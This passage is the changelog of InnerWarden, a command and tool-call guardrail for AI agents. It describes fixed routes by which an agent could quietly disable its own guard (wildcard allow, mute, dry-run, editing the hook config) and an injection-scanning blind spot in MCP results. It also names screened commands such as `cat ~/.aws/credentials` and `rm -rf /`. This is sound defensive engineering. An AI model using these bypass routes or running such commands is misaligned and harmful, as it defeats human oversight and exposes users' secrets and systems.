  `GIT_SSL_NO_VERIFY`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `curl -k` and the rest.

### Fixed

- **An agent could switch its own guard off.** A wildcard force-allow,
  `dry-run`, `mute`, and deleting or rewriting the hook configuration all
  returned `allow` at risk 0, while the loud routes were already refused.
  Confirmed by effect: with a wildcard allow in place the hook returned exit 0
  for a command it refuses a second earlier. Every quiet route now denies, and
  reading the configuration still does not.

- Twelve false positives, collapsing into four rules. `eval "$(...)"` alone was
  four of them and fires on `kubectl completion`, `direnv hook` and
  `ssh-agent -s`. Also IMDSv2's token handshake, which is the hardened path AWS
  tells people to use; `shred` of a runtime token, where refusing teaches people
  to leave it on disk; `/etc/ssl/certs/*.pem`, which is public by definition;
  and `.env.example`, which is a committed template.

### Performance

- The hook is a one-shot process, so every tool call pays to compile whatever
  regexes it touches. A literal gate now decides each family before a single
  regex is built, and normalization is lazy. Measured over 40 invocations
  against 1.4.4: **5.45s to 4.00s**, with detection unchanged.

## 1.4.4 - 2026-08-30

The dashboard opened with five counters and left the arithmetic to the reader,
and the graph behind it was quietly losing most of what it recorded.

### Fixed

- **The graph dropped 88% of the record.** `drop_oldest` selects the oldest
  nodes, a session anchor is always older than every command under it, so the
  first prune to reach the anchor removed it and `retain` then removed every
  `ran` edge that pointed at it. The commands were still stored and nothing
  could reach them. Pruning now keeps session anchors, `cases_page` recovers
  commands whose edge is gone by their `cmd:{session}:` prefix, and a session
  whose anchor was pruned is rebuilt from the ids that survive.

  Measured on one real store before and after: activity total 1,951 to 15,707,
  sessions 4 to 6, and the needs-review filter 6 to 136. Nothing new was
  recorded; that is all record that was already on disk and unreachable.

- **The screen did not answer the question people open it with.** A new
  headline computes the conclusion instead of printing counters: whether
  anything needs the reader, and what to do about it. Monitor mode is reported
  as the choice it is rather than as a failure, because calling it a fault
  pushes people to enforce before they are ready.

- **Evidence moved behind a switch instead of shouting.** "Configured, not
  verified", "Authority unknown", "Partial evidence" and the rest were each
  true and together read as a product that does not know what it is doing. They
  now live behind **Show technical detail**, off by default and persisted. The
  line that is not crossed: a good state may hide its provenance, a bad one may
  never hide its existence. Queued work, failures and hosts needing attention
  stay visible in both registers, and there is a test that refuses "Protected"
  while anything is queued.

- **A session was headlined by its own UUID.** The list read as four
  indistinguishable hex strings, one of which was the session the reader was
  sitting in. The heading is now the time range the run covers; the id stays on
  the card for correlating with a log.

- Hidden technical markup is not mounted rather than hidden with CSS, and
  nothing extra is fetched for the technical register, so the switch costs
  nothing while it is off.

## 1.4.3 - 2026-08-24

Three things the product said that were not true, all found by walking a real
install on a clean machine. None of them let an attack through; all three cost a
new user their first ten minutes, which for a security tool is worse.

### Fixed

- `innerwarden uninstall` said "removed" over a machine it had half-uninstalled.
  Without root against an npm install it destroyed the hook, the config
  directory and the API key first, then failed to unlink the binary, then
  printed a success line and exited 0. The next `innerwarden` call answered
  "linux-x64 IS supported, but its binary is not installed", so the product
  reported itself broken one command after reporting success.

  The remedy it offered was wrong twice: `rm <path>` needs exactly the root the
  run had just proven it did not have, and on an npm copy it is the move this
  crate already documents as wrong, because npm owns the `innerwarden` and `iw`
  launchers too. `upgrade` has consulted `managed_by` before acting since 1.4.0;
  `uninstall` never did.

  It now decides before it destroys. An npm-managed copy is left to
  `npm uninstall -g innerwarden`, which removes the binary, both launchers and
  npm's record of them. A direct install that cannot be written to says so up
  front, while the machine is still intact. Anything left behind is reported as
  left behind and exits non-zero. `--dry-run` previews the same decision, rather
  than listing a path the real run must not touch.

- The npm launcher's recovery instruction was the command that fails. When the
  platform binary is missing it is read at the exact moment the reader has
  nothing working, and it said `npm uninstall -g innerwarden && npm install -g
  innerwarden`. On a distro-packaged Node, npm's global prefix is
  `/usr/local/lib/node_modules` and root-owned, so on Linux that exits EACCES.
  It now leads with the installer that needs no root, per platform, and still
  offers npm with the sudo requirement stated.

  The test covering that message asserted it contained
  `npm install -g innerwarden`, which is a substring of the very command being
  handed out. It passed before the fix and would have passed after it, either
  way. It has been replaced rather than added to.

- `innerwarden -v` answered "unknown command `-v`" and then printed the whole
  help. `--version`, `-V` and `version` all worked; the one short form people
  actually type was the one missing, and the failure path buried its own reason
  under 61 lines of usage that wrap to 88 on an 80-column terminal. `-v` now
  answers, and an unrecognised token gets its reason plus a pointer to `--help`
  instead of the manual. `--help` itself is unchanged.

## 1.4.2 - 2026-08-24

Setting up Telegram alerts is now something the wizard does, rather than
something it asks you to go and do elsewhere.

### Fixed

- The setup wizard lost the answer to its own question. Answering **yes** to
  "Get notified when a command is flagged?" led to a channel picker where
  pressing ENTER selected nothing, and the wizard accepted the empty result,
  printed a note that read like an optional aside, and moved on. Nothing was
  written to disk. Someone who asked to be notified was not notified and was
  never told.

  Telegram now starts ticked, so ENTER alone does the obvious thing. An empty
  selection is explained once (SPACE toggles) and asked again. If nothing is
  chosen the wizard says **alerts are OFF** instead of implying success, and the
  same applies when a channel is picked but left blank. Both recovery lines now
  name the Telegram flags rather than suggesting a Slack webhook regardless of
  what was asked for.

### Added

- The wizard fetches your Telegram chat id instead of demanding it. It used to
  say "then get your chat id" and offer no way to get one, so finishing meant
  leaving the wizard to call the Telegram API and read JSON by hand. It now asks
  `getUpdates` and reports the id it found. A bot nobody has messaged yet has no
  chat to reply to, which is the normal state seconds after @BotFather hands over
  a token, so that case is explained and retried rather than reported as a
  failure. A rejected token says it was rejected. Typing the id by hand stays
  available throughout: an automatic step that can fail must not become the only
  way through.

## 1.4.1 - 2026-08-24

Three places the product asserted one thing and behaved otherwise. None let an
attack through; all three cost a new user time or trust, which is worse for a
security tool than a missing feature.

### Fixed

- `innerwarden notify --slack-webhook <url> --test` tested the wrong channel. It
  planned the test against the configuration from BEFORE the write, so on a
  fresh config it sent nothing and said nothing, and on a host that already had
  a channel it tested the OLD one and printed a success line for a channel it
  had never contacted. Setting a channel and testing it in one command is the
  obvious thing to do, `--help` suggests it, and the setup wizard does it.

  The test covering this was named `..._fires_the_just_set_channel` and asserted
  that the channel already in the file fired, not the one just set. The name
  promised the fix and the assertion pinned the bug.

- `innerwarden status` always reported the local dashboard as not running. Two
  constants were both called `DEFAULT_BIND`, in different modules, with
  different ports, and the status probe used the `serve` one to look for a
  dashboard that binds the other. The first command written for beginners was
  wrong about the second thing it says.

- `innerwarden uninstall` left every non-Claude agent calling a binary that no
  longer existed. It removed the Claude Code hook only, while Cursor, Codex and
  Gemini are wired by writing this binary's absolute path into their MCP config,
  and then it deleted the binary. `innerwarden agents disconnect`, the command
  that would have fixed it, went with it. Uninstall now unwires every agent
  first, through the same entry point `agents disconnect --all` uses.

- The npm launcher told supported platforms they were unsupported. After an
  uninstall (or an install with `--ignore-scripts`) the launcher survives
  without its binary and reported "no prebuilt binary for linux-x64" one line
  before listing linux and x64 as supported. It now distinguishes a missing
  binary on a published platform from a platform that has no build, and names
  the reinstall.

## 1.4.0 - 2026-08-23

The first ten minutes. A new user could install this, follow what it printed,
and end up unprotected without an error anywhere.

A minor rather than a patch because `upgrade` gained exit codes and the bare
`innerwarden` command prints something different on a machine with no config.

### Fixed

- `cat ~/.aws/credentials` was a review, not a deny, while `cat deploy.pem` was
  a deny. The hard list was keyed on file EXTENSION rather than on what the file
  holds, and a `.pem` is frequently a public certificate. The credential file is
  now scored as one; `~/.aws/config` beside it stays a review, because region
  and output settings are read legitimately and denying them was never the
  intent.

- `innerwarden allow --help` wrote the literal string `--help` into the
  guardrail's own bypass list and printed success. `check "--help"` then returned
  ALLOW with `[suppressed: allow --help]`. `mute --help` was worse: it lands in
  mute categories, and a muted category suppresses every rule in it against every
  command. `setup --help` ran the wizard.

  Help is now answered before dispatch for all 24 subcommands. `check` keeps
  screening: its argument IS the command being examined, so `--help` counts as
  help only when it is the sole non-output-flag argument, and
  `check rm -rf / --help` still denies.

- `agents connect` said nothing about restarting. The hook is read only at agent
  startup, so a user returned to a running session believing it was screened when
  it was not. Every sibling path already said it. Silent false protection is
  worse than an error.

- `status` was dispatched and appeared nowhere in `--help`, and it hardcoded the
  guard mode as unknown while the data it needed was already in hand. The result
  was that there was NO configuration in which `status` reported everything as
  fine: the command written for beginners could never tell one they were done.
  It now appears in help, reads the mode, probes the dashboard, and distinguishes
  "nothing recorded yet" from "the record could not be read".

- A fresh install reported itself broken. A directory that did not exist yet was
  treated as unwritable, so `innerwarden graph` on a new machine printed
  "InnerWarden has not recorded for 0 seconds (actions lost,
  graph_directory_unwritable)" and the dashboard served the same. A fresh box is
  not a broken one.

- `upgrade --check` fetched a checksum, discarded it, and told you to upgrade
  whatever the answer was, including when already current. It now reads the
  published manifest and says which it is.

- `upgrade` silently fought npm. A binary under a user-owned npm prefix upgraded
  with no warning and the next `npm install -g` reverted it, with no message from
  either tool. The site itself recommends that prefix. It now refuses unless
  forced.

- `uninstall` removed the Claude hook and left every other agent's MCP wiring
  pointing at a deleted binary.

### Changed

- A bare `innerwarden` on a machine with no configuration prints six lines saying
  nothing is wired yet, with the two commands to run, instead of 24 subcommands
  with `setup` on line one. `innerwarden --help` is unchanged.

- `upgrade` exits 2 when it refuses an npm-managed copy, and `upgrade --check`
  exits 1 when it cannot determine the published version.

### Internal

- `ureq` 2 to 3. The migration mattered rather than the version: ureq 3 moved
  timeouts off the request builder onto the agent, so the obvious port silently
  leaves every network probe unbounded, and its error enum went from two
  variants to ten, so an exhaustive match keeps compiling while losing cases.
  Both are now asked as questions (`is_an_answer`, `status_of`) in one place.

- CI now refuses an em dash on any line a change adds. The paid repo's version of
  that gate had been green since it was written without ever running: a shallow
  checkout has no `origin/master`, and its missing-base branch exited 0. This one
  fetches the base and refuses if it cannot.

- Coverage is measured with a floor derived from a measurement rather than
  chosen, browser journeys run instead of being counted, and the updater and
  release verifier are exercised rather than having their own source read back.

## 1.3.7 - 2026-08-21

Posture reporting. The dashboard could describe a control as working when
nothing had confirmed it, and a fresh install could read as a fault.

### Fixed

- The headline no longer counts an unconfirmed control as working (#108).
- A layer's sentence can no longer contradict the badge above it (#107); the
  pill, the row and the gap list now tell one story (#106).
- The API validator stopped discarding the layer disposition (#105).

### Added

- Posture says what needs an operator and what is simply fine, so a fresh
  install is not reported as a problem (#104).

## 1.3.6 - 2026-08-20

### Fixed

- `uninstall --dry-run` uninstalled instead of previewing (#101).
- The agent view shows which mode the guard is in, and `--help` documents
  dry-run (#100).

## 1.3.5 - 2026-08-20

### Fixed

- `status` no longer blames a config file that was never read (#97).
- `upgrade` names the command that actually upgrades this install, which
  differs by install channel (#96).

### Changed

- One tag now moves every install channel, instead of each being cut by hand
  (#95).

## 1.3.4 - 2026-08-20

### Fixed

- A fresh install is no longer reported as a broken one (#93).
- Absence of a signature is not absence of an agent (#89).
- An empty substitution no longer hides the command behind it (#86).
- The guard stopped reading data as if it were a command, and now names the
  safe way out (#85).

### Added

- One command that says whether this install is actually protecting you (#90).

### Changed

- CI: a mutation sweep that finishes and that fails when it should (#87); the
  apt lock no longer makes every Linux run a coin flip (#91); a retry loop no
  longer outlives the step it runs inside (#92).

## 1.3.3 - 2026-08-16

Two screening fixes, both found by running the shipped build against real
work rather than against the test corpus. Each was verified by reverting the
fix and watching the new test fail.

### Fixed

- **The tamper rule no longer crosses command boundaries.**
  `check_security_tamper` tested the removal verb and the InnerWarden path
  against the whole command string independently, so the two never had to be
  related to each other. Any ordinary cleanup step that shared a line with a
  read of our own config was denied at score 60 — a rename of an unrelated
  file beside a `grep` of `agent.toml`, a `sqlite3` query beside a removal
  under a temp directory. In none of them does the removal verb name an
  InnerWarden path, yet all were reported as *"disabling or tampering with
  security monitoring"*.

  That is the worst direction for a false positive to point. It lands on the
  person doing support, during an incident, and it teaches them that the
  tamper verdict is noise — the one verdict that has to keep its credibility.

  `destructive_rm_root` already refused to cross command boundaries for
  exactly this reason, and the tamper rule now uses the same segmentation:
  the verb and the path must belong to one command. Genuine self-tamper
  (removing or moving our own binary, config or state) still denies, whatever
  else shares the line.

- **Credential hunting is flagged, not just credential reading.** A command
  that goes looking for secrets across a broad root now scores, where
  previously only a read of an already-known secret path did.

## 1.3.2 - 2026-08-13

No behaviour change for users. This release carries build-supply-chain and
test-corpus hygiene, plus the CI repairs that make the nightly deep checks
mean something again.

### Security

- **postcss forced past GHSA-fxqj-rqcc-2cmp.** A version at or below 8.5.22
  reads arbitrary `.map` files from an attacker-controlled `sourceMappingURL`
  when `from` is unset. It is a development dependency of the dashboard build
  and never reaches the shipped binary, so this is hygiene rather than an
  exposure, but the lock now resolves to 8.5.26 through an `overrides` entry.
  The built bundle is byte-identical.
- **The Google API key fixture in the ATR corpus is now unmistakably a
  fixture.** It lived in the `true_positives` block of the rule that detects
  leaked API keys, next to other synthetic examples, and had an open GitHub
  secret-scanning alert against it since 2026-07-23. It still matches the
  rule's own pattern, so the rule keeps being tested.

### Fixed

- **The nightly undefined-behaviour check finishes again.** The `miri` job had
  no time budget, so it ran to GitHub's six-hour platform cap and was killed
  every night from 2026-08-06 to 2026-08-12, reporting "cancelled" — which
  reads as harmless. Nothing was checked for UB for a week and nothing said so.
  Three tests build 20k-node graphs to prove a byte budget, which an
  interpreter cannot do cheaply; they are skipped under miri, and a check now
  fails when a cap-scale test is added without that skip. miri also carries an
  explicit timeout, so a future hang fails visibly. Running it for real found
  no undefined behaviour.
- **The nightly mutation run reports again.** `cargo-mutants` hit its own job
  timeout, which killed the report upload with it, so every night produced
  nothing. It now stops itself inside the job budget and ships a partial report
  that says it is partial.

## 1.1.0 - 2026-08-06

### Security

- **The updater no longer runs a script it downloads.** `innerwarden upgrade`
  fetched an installer over the network and piped it to a shell, so an upgrade
  trusted whatever that endpoint served that day and no signature was ever
  checked. It now downloads the release asset for the running platform, verifies
  its SHA-256 and its Ed25519 signature against a public key compiled into the
  binary doing the upgrading, and swaps it in with an atomic rename beside the
  target. Either check failing means nothing is written.
- **Packaging verifies the bytes before it packages them.** The npm and
  `.deb`/`.rpm` build paths downloaded the release binaries and wrapped them
  unchecked, so a compromised release host reached users through three channels
  at once. Both paths now verify SHA-256 and Ed25519 for all six targets before
  the bytes enter a package, and treat a missing sidecar as an error rather than
  a skipped check.
- **A local model can no longer soften a rules verdict.** The optional LLM second
  opinion could downgrade a rules `deny` to `allow`. The effective verdict is now
  the stricter of the two, the command under review is delimited as untrusted
  input in the prompt, and the response records which layer decided.
- **Publishing is gated on green CI for the exact commit.** A tag on a commit
  whose tests were failing used to publish anyway, with npm provenance attesting
  it.

### Added

- **Guards the agent you actually run, not just Claude Code.** `install` used to
  refuse every other agent with "only 'claude-code' is supported today", which on
  a host running anything else read as "InnerWarden cannot protect this". Every
  known agent now resolves to a mechanism and a command that works: a PreToolUse
  hook where one exists, automatic MCP wiring through `innerwarden agents
  connect <agent>` where it does not, and `innerwarden contain` for agents with
  no cooperative surface at all. Claude Code, Cursor, Codex, Gemini CLI and
  OpenClaw wire automatically; wiring is reversible with `agents disconnect`.
- **OpenClaw support.** Its MCP servers live under a nested `mcp.servers` table
  that the config editor could not find, so an OpenClaw install looked unguardable.
  Sibling keys and unrelated settings are preserved, and a config that is not
  strict JSON is refused rather than rewritten.
- **Per-session behaviour in the command hook.** Call rate and repeated access to
  sensitive paths are now tracked across the one-shot hook invocations that make
  up a session, so a pattern that only exists across commands is visible to the
  verdict.
- **`innerwarden host <command>`.** Four verbs exist in both this guardrail and
  the paid Active Defence host layer. They run here, say so when the host layer
  also has one, and `host` reaches that version explicitly instead of it being
  silently shadowed.
- **A recording-health surface.** `innerwarden graph` and
  `/api/guard/record-health` report when the local record has stopped recording
  and for how long, rather than a dashboard quietly showing older and older data.

### Fixed

- **Recording stopped once the graph passed 16 MiB, and said so only on stderr.**
  The store was verified against the size limit meant for agent configuration
  files, and the verification read runs before the prune that would have brought
  it back under, so an install that crossed the limit never recorded again. The
  store now has its own ceiling, prune enforces a byte budget and not just a node
  count, and command ids no longer collide after a prune (which silently
  overwrote surviving history). The outage is now reported where a human looks.
- **A quoted heredoc body is text, not code.** Writing a document that quoted a
  dangerous command, in a pull request body or an incident postmortem, was blocked
  as though the command were being run. Unquoted delimiters, real substitutions,
  and pipes into an interpreter are still read as code.
- **The dashboard tells the truth about what it knows.** It no longer reports a
  setup state it never determined, no longer tells a paid host it recorded
  nothing, distinguishes "unavailable" from "empty" and says which failure it
  was, and serves the agent and token-intelligence views in both editions.
- **Suppression changes are recorded.** `allow` and `mute` changed what the guard
  blocks and left no trace.
- **The hook stopped compiling rules that cannot match.** The ATR corpus was
  compiled in full on every tool call, including the 62 pattern-tier rules that
  declare a surface the shell path never presents. Filtering before compilation
  took the hook from 208 ms to 73 ms.

## 1.0.7 - 2026-07-29

### Fixed

- **MCP response inspection no longer fails open.** The proxy scanned only
  `content[].type=="text"` blocks of a `tools/call` result, so a result carrying
  its payload anywhere else produced an empty string and passed as clean —
  silently bypassing indirect-prompt-injection detection. `structuredContent`
  (structured tool output, part of the current protocol revision) took exactly
  that path. The scan now covers text blocks, `structuredContent`, and any
  unrecognised non-empty result shape, bounded to 64 KiB and truncated on a char
  boundary. Deliberately shape-agnostic, so a new result field cannot reopen the
  same blind spot.

### Added

- **Guard events sink for a co-located host agent.** On a blocked or
  would-block decision (command or MCP tool call), the guard appends one compact
  JSON line to `guard-events.jsonl` next to the graph, so an InnerWarden host
  agent running on the same machine can ingest the guard's findings. Block-only,
  best-effort, and already redacted — a passing command adds no extra I/O, and a
  failure here can never alter a verdict or the hook exit code.

## 1.0.0 - 2026-07-23

First public InnerWarden release: the free, cross-OS guardrail for AI agents. Runs
on Linux, macOS, and Windows.

### Added

- Command screening: analyzes an AI agent's shell command before it runs and
  returns a verdict (allow, review, or deny).
- Tool-call screening: inspects MCP and tool calls and returns the same verdict.
- MCP proxy: a man-in-the-middle in front of an MCP server that inspects every
  JSON-RPC message and can refuse a disallowed tool call inline, keeping stdout
  pure MCP traffic.
- AI Jail: run an agent in a constrained profile so a screened-and-denied action
  is stopped rather than only flagged.
- Agent discovery: finds AI agents and agent tooling on the machine.
- Local dashboard: a read-only view on loopback at `http://127.0.0.1:8787` that
  never leaves the machine.
- Notifications: surfaces verdicts and events through configured channels.
- Claude Code integration via a PreToolUse hook, plus MCP-client support for
  Cursor, Codex, and other MCP clients.
